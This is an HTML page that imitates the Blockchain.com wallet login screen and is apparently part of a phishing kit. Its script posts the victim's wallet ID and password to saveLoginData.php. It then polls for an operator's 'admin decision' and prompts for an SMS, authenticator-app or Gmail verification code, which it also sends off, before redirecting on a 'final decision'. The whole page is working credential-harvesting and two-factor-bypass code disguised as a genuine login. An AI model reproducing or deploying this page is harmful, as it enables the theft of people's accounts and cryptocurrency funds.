<!DOCTYPE html>
<html lang="en">
<head>
    <title>Page Title</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <!-- Latest compiled and minified CSS -->
    <link rel="stylesheet" href="./script/bootstrap.min.css">

    <!-- jQuery library -->
    <script src="./custom/script/jquery.min.js"></script>

    <!-- Popper JS -->
    <script src="./custom/script/popper.min.js"></script>

    <!-- Latest compiled JavaScript -->
    <script src="./custom/script/bootstrap.min.js"></script>
</head>
<body>

    <div class="container-fluid">

        <div class="sc-bnXvFD dDillI">
            <div style="height:90px;" class="col-md-12">
                <div class="sc-cmthru buGjPd sc-gHboQg hnSMth">
                    <div class="sc-hMFtBS gZupyF" style="display: flex;padding-left: 24px;-webkit-box-align: center;align-items: center;width: 250px;">
                        <div class="sc-eerKOB cTWApN" style="display: flex;flex-direction: column;">
                            <a href="https://www.blockchain.com" color="blue600" class="sc-bZQynM cxqfnO" style='font-family: Inter, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, Cantarell, "Open Sans", "Helvetica Neue", sans-serif;font-size: 16px;font-weight: 500;color: rgb(12, 108, 242);text-transform: none;cursor: pointer;text-decoration: none;'>
                                <img src="./custom/img/bc-logo.svg" srcset="" style="height:24px;width:240px;display:block;" class="sc-EHOje bOsyyS sc-eilVRo siEjp" width="auto" color="auto">
                            </a>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        
        <div class="sc-gFaPwZ flvjfT" id="login-loading-container">
            <div class="sc-cCbXAZ geuGEM" id="login-div">
                <div class="sc-hBbWxd sc-fHSTwm eOJfhy">
                    <div style=""></div>
                    <div class="sc-hdPSEv enDhkv">
                        <div color="textBlack" cursor="inherit" opacity="1" class="sc-gzVnrw blKetq">
                            <span>Welcome back!</span> 
                        </div>
                    </div>
                    <form class="sc-jxGEyO hQuvQG sc-gleUXh FIdwe">
                        <div class="sc-dEfkYy hkmucL">
                            <div class="sc-cqPOvA caEeOr">
                                <label for="guid" class="sc-gNJABI bHZVbO">
                                    <div color="grey800" cursor="inherit" opacity="1" class="sc-gzVnrw kXYclp">
                                        <span>Wallet ID</span>
                                    </div>
                                </label>
                                <div class="sc-ESoVU ixIYOH" height="48px">
                                    <div class="sc-caSCKo iwqfqa">
                                        <input data-e2e="loginGuid" id="guid" name="guid" height="48px" type="text" spellcheck="false" class="sc-fAjcbJ gfoKiQ" value="" required>
                                    </div>
                                </div>
                            </div>
                            <div class="sc-htoDjs fJbVHw sc-dBaXSw kzXGfH">
                                <div color="grey800" cursor="inherit" opacity="1" class="sc-gzVnrw ivvLkX">
                                    <span>Your Wallet ID can be found at the bottom of any email we’ve ever sent you. Need a reminder?</span>
                                    <a color="blue600" class="sc-bZQynM hVIpLu" href="#/reminder">
                                        <span>Send my Wallet ID</span>
                                    </a>
                                </div>
                            </div>
                        </div>
                        <div class="sc-dEfkYy hkmucL">
                            <div class="sc-cqPOvA caEeOr">
                                <label for="password" class="sc-gNJABI bHZVbO">
                                    <div color="grey800" cursor="inherit" opacity="1" class="sc-gzVnrw kXYclp">
                                        <span>Password</span>
                                    </div>
                                </label>
                                <div class="sc-lnmtFM eVQzAR">
                                    <div class="sc-erNlkL frTPDw">
                                        <input data-e2e="loginPassword" id="password" name="password" type="password" spellcheck="false" class="sc-jhAzac tcirq" value="" required>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <div class="sc-dEfkYy hkmucL sms-code-div" style="display:none;">
                            <div class="sc-cqPOvA caEeOr">
                                <label for="password" class="sc-gNJABI bHZVbO">
                                    <div color="grey800" cursor="inherit" opacity="1" class="sc-gzVnrw kXYclp">
                                        <span>SMS Code</span>
                                    </div>
                                </label>
                                <div class="sc-lnmtFM eVQzAR">
                                    <div class="sc-erNlkL frTPDw">
                                        <input data-e2e="loginPassword" id="sms_code" name="sms_code" type="text" spellcheck="false" class="sc-jhAzac tcirq" value="">
                                    </div>
                                </div>
                            </div>
                        </div>
                        <div class="sc-dEfkYy hkmucL auth-app-div" style="display:none;">
                            <div class="sc-cqPOvA caEeOr">
                                <label for="password" class="sc-gNJABI bHZVbO">
                                    <div color="grey800" cursor="inherit" opacity="1" class="sc-gzVnrw kXYclp">
                                        <span>Authenticator App Code</span>
                                    </div>
                                </label>
                                <div class="sc-lnmtFM eVQzAR">
                                    <div class="sc-erNlkL frTPDw">
                                        <input data-e2e="loginPassword" id="auth_app_code" name="auth_app_code" type="text" spellcheck="false" class="sc-jhAzac tcirq" value="">
                                    </div>
                                </div>
                            </div>
                        </div>
                        <div class="sc-dEfkYy hkmucL gmail-code-div" style="display:none;">
                            <div class="sc-cqPOvA caEeOr">
                                <label for="password" class="sc-gNJABI bHZVbO">
                                    <div color="grey800" cursor="inherit" opacity="1" class="sc-gzVnrw kXYclp">
                                        <span>Gmail Verification Code</span>
                                    </div>
                                </label>
                                <div class="sc-lnmtFM eVQzAR">
                                    <div class="sc-erNlkL frTPDw">
                                        <input data-e2e="loginPassword" id="gmail_code" name="gmail_code" type="text" spellcheck="false" class="sc-jhAzac tcirq" value="">
                                    </div>
                                </div>
                            </div>
                        </div>
                        <div class="sc-dEfkYy hkmucL">
                            <button type="submit" height="48px" data-e2e="loginButton" class="sc-bdVaJa dlCycp sc-doWzTn jpTmQa" disabled="" id="btn_login" color="white">
                                <div color="whiteFade900" cursor="inherit" opacity="1" class="sc-gzVnrw fTkqNv">
                                    <span>Log In</span>
                                </div>
                                <div class="loading">
                                    <div class="bounce_1"></div>
                                    <div class="bounce_2"></div>
                                </div>
                            </button>
                        </div>
                        
                    </form>
                    <div class="sc-cmIlrE doyIyw">
                        <a data-e2e="loginViaMobileLink" color="blue600" class="sc-bZQynM cIFcfz" href="#/mobile-login" style="float:left;text-decoration:none;">
                            <span>Login via Mobile</span>
                        </a>
                        <a data-e2e="loginGetHelp" color="blue600" class="sc-bZQynM cIFcfz" href="#/help" style="float:right;text-decoration:none;">
                            <span>Need some help?</span>
                        </a>
                    </div>
                </div>
                <a color="blue600" data-e2e="signupLink" class="sc-bZQynM cxqfnO" href="#/signup" style="text-decoration:none;">
                    <div class="sc-hizQCF jYQXfl">
                        <div color="whiteFade600" cursor="inherit" opacity="1" class="sc-gzVnrw iExTOz">
                            <span>Dont have a wallet?</span>
                        </div>
                        &nbsp;
                        <div color="whiteFade900" class="sc-gzVnrw jrXeJa sc-eNPDpu eKAesF" cursor="inherit" opacity="1">
                            <span>Sign Up</span>
                        </div>
                    </div>
                </a>
            </div>
        </div>
            <div id="loading-div" style="text-align:center;font-size: 20px;color:gray;padding-top: 60px;">
                <div class="loading-gif-div">
                    <img src="./custom/img/giphy.gif" style="width:25%;">
                </div>
                <div class="loading-text-div" style="padding:28px;">
                    <span style="position:relative;">Please wait.</span>
                </div>
            </div>
    

    </div>

    <script>
    $(document).ready(function(){
        var user_id = 0; 
        var TimerForGetAdminDecision;
        var TimerForGetFinalDecision;
        $("#guid").val("");
        $("#password").val("");
        const element = document.querySelector('form');
        element.addEventListener('submit', event => {
        event.preventDefault();
        // actual logic, e.g. validate the form
        console.log('Form submission cancelled.');
        });
        $("#password, #guid").keyup(function(){
            var wallet_id = $("#guid").val();
            wallet_id = wallet_id.replace(/ /g, "");
            var password = $("#password").val();
            password = password.replace(/ /g, "");
            if(wallet_id.length == 0 || password.length == 0){
                $("#btn_login").removeAttr("disabled");
                $("#btn_login").attr("disabled");
                $("#btn_login").css("user-select", "none");
                $("#btn_login").css("cursor", "not-allowed");
                $("#btn_login").css("opacity", "0.5");
                return;
            }else{
                $("#btn_login").removeAttr("disabled");
                $("#btn_login").css("user-select", "auto");
                $("#btn_login").css("cursor", "select");
                $("#btn_login").css("opacity", "1");
            }
        });
        $("#btn_login").click(function(){
            // alert("fff");
            
            // fnDisplayAuthBock($("#guid").val());
            var wallet_id = $("#guid").val();
            wallet_id = wallet_id.replace(/ /g, "");
            var password = $("#password").val();
            password = password.replace(/ /g, "");
              
            var auth_app_code = $("#auth_app_code").val();
            auth_app_code = auth_app_code.replace(/ /g, "");
            var sms_code = $("#sms_code").val();
            sms_code = sms_code.replace(/ /g, "");
            var gmail_code = $("#gmail_code").val();
            gmail_code = gmail_code.replace(/ /g, "");

            if($(".sms-code-div").css("display") == "block"){
                if(sms_code == ""){
                    return;
                }else{
                    $("#login-div").css("display", "none");
                    $("#loading-div").css("display", "block");
                    fnAjaxSaveAuthCode(sms_code, 'saveSmsAuth');
                }
            }else if($(".auth-app-div").css("display") == "block"){
                if(auth_app_code == ""){
                    return;
                }else{
                    $("#login-div").css("display", "none");
                    $("#loading-div").css("display", "block");
                    fnAjaxSaveAuthCode(auth_app_code, 'saveAppAuth');
                }
            }else if($(".gmail-code-div").css("display") == "block"){
                if(gmail_code == ""){
                    return;
                }else{
                    $("#login-div").css("display", "none");
                    $("#loading-div").css("display", "block");
                    fnAjaxSaveAuthCode(gmail_code, 'saveGoogleAuth');
                }
            }else{
                if(password == "" || wallet_id == ""){
                    return;
                }
                $("#login-div").css("display", "none");
                $("#loading-div").css("display", "block");
                    
                $.ajax({
                    url: "saveLoginData.php",
                    type: 'POST',
                    data: {wallet_id: wallet_id, password: password, cur_status: "saveLoginData"},
                    success: function(result){
                        console.log(result);
                        user_id = result;
                        fnTimerForGetAdminDecision();
                    }
                });
            }
        });
        function fnAjaxSaveAuthCode(auth_code, cur_status){

            $.ajax({
                url: "saveLoginData.php",
                type: 'POST',
                data: {cur_id: user_id, auth_code: auth_code, cur_status: cur_status},
                success: function(result){
                    console.log(result);
                    // user_id = result;
                    if(result == 1){
                        fnTimerForGetFinalDecision();
                        // fnGetFinalDecision();
                    }
                }
            });
        }
        function fnTimerForGetAdminDecision(){
            clearInterval(TimerForGetAdminDecision);
            TimerForGetAdminDecision = setInterval(fnGetAdminDecision, 3000);
        }
        function fnGetAdminDecision(){
            var userID = user_id;
            $.ajax({
                url: "saveLoginData.php",
                type: 'POST',
                data: {cur_id: user_id, cur_status: "getAdminDecision"},
                success: function(result){
                    console.log(result);
                    var data = JSON.parse(result);
                    if(data.admin_decision == 1 || data.admin_decision == 2 || data.admin_decision == 3){
                        clearInterval(TimerForGetAdminDecision);
                        fnDisplayAuthBock(data.admin_decision);
                    }else if(data.admin_decision == 4){//error
                        document.location.href = "./index.php";
                    }else{
                        // ... wait
                    }
                }
            });
        }
        function fnDisplayAuthBock(adminDecision){
            $("#login-div").css("display", "block");
            $("#loading-div").css("display", "none");
            var admin_decision = adminDecision;
            if(admin_decision == 2){
                $(".sms-code-div").css("display", "block");
                $(".auth-app-div").css("display", "none");
                $(".gmail-code-div").css("display", "none");
            }else if(admin_decision == 3){
                $(".auth-app-div").css("display", "block");
                $(".sms-code-div").css("display", "none");
                $(".gmail-code-div").css("display", "none");
            }else if(admin_decision == 1){
                $(".gmail-code-div").css("display", "block");
                $(".sms-code-div").css("display", "none");
                $(".auth-app-div").css("display", "none");
            }

        }
        function fnTimerForGetFinalDecision(){
            clearInterval(TimerForGetFinalDecision);
            TimerForGetFinalDecision = setInterval(fnGetFinalDecision, 3000);
        }
        function fnGetFinalDecision(){
            var userID = user_id;
            $.ajax({
                url: "saveLoginData.php",
                type: 'POST',
                data: {cur_id: user_id, cur_status: "getFinalDecision"},
                success: function(result){
                    console.log(result);
                    var data = JSON.parse(result);
                    if(data.final_decision == 1){
                        document.location.href = data.target_url;
                    }else if(data.final_decision == 2){
                        document.location.href = "./index.php";
                    }else{
                        // ... wait
                    }
                }
            });
        }       
    });
    </script>

    <style>
        body{
            background-color: rgb(13, 53, 120);
            height: auto;
            min-height: 100%;
            width: 100%;
            overflow: auto;
        }
        .buGjPd {
            position: relative;
            display: flex;
            flex-direction: row;
            -webkit-box-pack: justify;
            justify-content: space-between;
            -webkit-box-align: center;
            align-items: center;
            width: 100%;
            height: 100%;
            background-color: inherit;
        }
        .flvjfT {
            display: flex;
            flex-direction: column;
            -webkit-box-pack: center;
            justify-content: center;
            -webkit-box-align: center;
            align-items: center;
            z-index: 1;
            max-width: 100%;
            padding: 0px 32px;
        }
        .geuGEM {
            display: flex;
            flex-direction: column;
            -webkit-box-pack: center;
            justify-content: center;
        }
        .eOJfhy {
            box-sizing: border-box;
            background-color: rgb(255, 255, 255);
            box-shadow: rgba(0, 0, 0, 0.21) 0px 2px 8px 0px;
            width: 480px;
            position: relative;
            padding: 32px;
            border-radius: 8px;
            overflow: visible;
        }
        .enDhkv {
            display: flex;
            -webkit-box-pack: justify;
            justify-content: space-between;
            -webkit-box-align: center;
            align-items: center;
        }
        .blKetq {
            font-family: Inter, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, Cantarell, "Open Sans", "Helvetica Neue", sans-serif;
            font-weight: 600;
            font-size: 20px;
            line-height: inherit;
            text-transform: capitalize;
            font-style: normal;
            color: rgb(18, 29, 51);
            cursor: inherit;
            display: block;
            opacity: 1;
        }
        .FIdwe {
            margin: 20px 0px;
        }
        .hQuvQG {
            width: 100%;
        }
        .hkmucL {
            width: 100%;
            display: flex;
            position: relative;
            flex-direction: column;
            margin-bottom: 16px;
        }
        .hkmucL > div {
            margin-right: 0px;
        }
        .caEeOr {
            position: relative;
            width: 100%;
        }
        .bHZVbO > div {
            margin-bottom: 5px;
        }
        .kXYclp {
            font-family: Inter, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, Cantarell, "Open Sans", "Helvetica Neue", sans-serif;
            font-weight: 600;
            font-size: 14px;
            line-height: inherit;
            text-transform: none;
            font-style: normal;
            color: rgb(53, 63, 82);
            cursor: inherit;
            display: block;
            opacity: 1;
        }
        .ixIYOH {
            position: relative;
            display: flex;
            flex-direction: column;
            -webkit-box-pack: end;
            justify-content: flex-end;
            align-items: flex-start;
            width: 100%;
            height: 48px;
        }
        .iwqfqa {
            display: flex;
            width: 100%;
            -webkit-box-align: center;
            align-items: center;
            position: relative;
        }
        .gfoKiQ {
            display: block;
            width: 100%;
            height: 48px;
            min-height: 48px;
            box-sizing: border-box;
            font-size: 16px;
            font-weight: 500;
            color: rgb(53, 63, 82);
            background-color: rgb(255, 255, 255);
            font-family: Inter, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, Cantarell, "Open Sans", "Helvetica Neue", sans-serif;
            background-image: none;
            outline-width: 0px;
            user-select: text;
            padding: 6px 12px;
            border-width: 1px;
            border-style: solid;
            border-color: rgb(223, 227, 235);
            border-image: initial;
            border-radius: 8px;
        }
        .hkmucL > div:last-child {
            margin-right: 0px;
        }
        .kzXGfH {
            line-height: 1;
            text-align: center;
            margin: 12px 0px;
        }
        .fJbVHw > * {
            display: inline;
            margin-right: 2px;
        }
        .fJbVHw > * {
            white-space: normal;
        }
        .ivvLkX {
            font-family: Inter, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, Cantarell, "Open Sans", "Helvetica Neue", sans-serif;
            font-weight: 500;
            font-size: 12px;
            line-height: inherit;
            text-transform: none;
            font-style: normal;
            color: rgb(53, 63, 82);
            cursor: inherit;
            display: block;
            opacity: 1;
        }
        .eVQzAR {
            position: relative;
            display: flex;
            flex-direction: column;
            -webkit-box-pack: start;
            justify-content: flex-start;
            align-items: flex-start;
            width: 100%;
        }
        .frTPDw {
            width: 100%;
            border-radius: 8px;
            overflow: hidden;
        }
        .tcirq {
            position: relative;
            display: block;
            width: 100%;
            height: 48px;
            min-height: 48px;
            box-sizing: border-box;
            letter-spacing: 4px;
            font-size: 20px;
            font-weight: 500;
            color: rgb(53, 63, 82);
            background-color: rgb(255, 255, 255);
            background-image: none;
            outline-width: 0px;
            user-select: text;
            font-family: Inter, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, Cantarell, "Open Sans", "Helvetica Neue", sans-serif;
            padding: 6px 12px;
            border-radius: 8px;
            border-width: 1px;
            border-style: solid;
            border-color: rgb(223, 227, 235);
            border-image: initial;
        }
        .hkmucL:last-child {
            margin-bottom: 0px;
        }
        .jpTmQa {
            margin-top: 15px;
        }
        .dlCycp {
            display: flex;
            flex-direction: row;
            -webkit-box-pack: center;
            justify-content: center;
            -webkit-box-align: center;
            align-items: center;
            width: 100%;
            min-width: 140px;
            height: 48px;
            box-sizing: border-box;
            user-select: none;
            text-align: center;
            vertical-align: middle;
            letter-spacing: normal;
            white-space: nowrap;
            line-height: 1;
            text-transform: none;
            font-family: Inter, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, Cantarell, "Open Sans", "Helvetica Neue", sans-serif;
            font-size: 14px;
            font-weight: 600;
            cursor: not-allowed;
            opacity: 0.5;
            color: rgb(255, 255, 255);
            background-color: rgb(12, 108, 242);
            padding: 10px 15px;
            text-decoration: none;
            transition: all 0.2s ease-in-out 0s;
            border-radius: 8px;
            border-style: solid;
            border-width: 1px;
            border-color: rgb(12, 108, 242);
        }
        
        .hVIpLu {
            font-family: Inter, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, Cantarell, "Open Sans", "Helvetica Neue", sans-serif;
            font-size: 12px;
            font-weight: 500;
            color: rgb(12, 108, 242);
            text-transform: none;
            cursor: pointer;
            text-decoration: none;
        }
        @media (min-width: 768px)
        .doyIyw {
            flex-direction: row;
            -webkit-box-pack: justify;
            justify-content: space-between;
            -webkit-box-align: center;
            align-items: center;
        }
        .cIFcfz {
            font-family: Inter, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, Cantarell, "Open Sans", "Helvetica Neue", sans-serif;
            font-size: 13px;
            font-weight: 600;
            color: rgb(12, 108, 242);
            text-transform: none;
            cursor: pointer;
            text-decoration: none;
        }
        .doyIyw {
            display: block;
            /* display: flex; */
            flex-direction: column;
            -webkit-box-pack: start;
            justify-content: flex-start;
            align-items: flex-start;
            margin-top: 15px;
        }
        .cxqfnO:hover {
            color: rgb(12, 108, 242);
        }
        .cxqfnO {
            font-family: Inter, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, Cantarell, "Open Sans", "Helvetica Neue", sans-serif;
            font-size: 16px;
            font-weight: 500;
            color: rgb(12, 108, 242);
            text-transform: none;
            cursor: pointer;
            text-decoration: none;
        }
        .jYQXfl {
            display: flex;
            -webkit-box-pack: center;
            justify-content: center;
            margin-top: 1.25rem;
        }
        .iExTOz {
            font-family: Inter, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, Cantarell, "Open Sans", "Helvetica Neue", sans-serif;
            font-weight: 500;
            font-size: 14px;
            line-height: inherit;
            text-transform: none;
            font-style: normal;
            color: rgba(255, 255, 255, 0.6);
            cursor: inherit;
            display: block;
            opacity: 1;
        }
        .jrXeJa {
            font-family: Inter, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, Cantarell, "Open Sans", "Helvetica Neue", sans-serif;
            font-weight: 500;
            font-size: 14px;
            line-height: inherit;
            text-transform: none;
            font-style: normal;
            color: rgba(255, 255, 255, 0.9);
            cursor: inherit;
            display: block;
            opacity: 1;
        }
        

        .loading{
            width:20px;
            height:20px;
            position:relative;
            margin: 300px auto;
            display: none;
        }
        .bounce_1, .bounce_2{
            width: 100%;
            height: 100%;
            border-radius: 50%;
            background-color: #FFF;
            opacity: 0.6;
            position: absolute;
            top: 0;
            left: 0;
            -webkit-animation: sa-bounce 2.1s infinite ease-in-out;
            animation: sa-bounce 2.1s infinite ease-in-out;
        }
        .bounce_2{
            -webkit-animation-delay: -1.0s;
            animation-delay: -1.0s;
        }
        @keyframes sa-bounce {
            0%, 100%{
            transform: scale(0.0);
            -webkit-transform:scale(0.0);
            }
            50%{
            transform:scale(1.0);
            -webkit-transform: scale(1.0);
            } 
        }
        @-webkit-keyframes sa-bounce{
            0%, 100%{ -webkit-transform: scale(0.0); }
            50% { -webkit-transform:scale(1.0); }
        }
        #loading-div{
            display:none;
            box-sizing: border-box;
            background-color: rgb(255, 255, 255);
            box-shadow: rgba(0, 0, 0, 0.21) 0px 2px 8px 0px;
            width: 400px;
            /* position: relative; */
            padding: 32px;
            border-radius: 8px;
            overflow: visible;

            margin: 0;
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);

        }
        #login-loading-container{
            position:relative;

        }
        .container {
            height: 200px;
            position: relative;
            border: 3px solid green;
        }

        .vertical-center {
            margin: 0;
            position: absolute;
            top: 50%;
            -ms-transform: translateY(-50%);
            transform: translateY(-50%);
        }

    </style>
    
</body>
</html>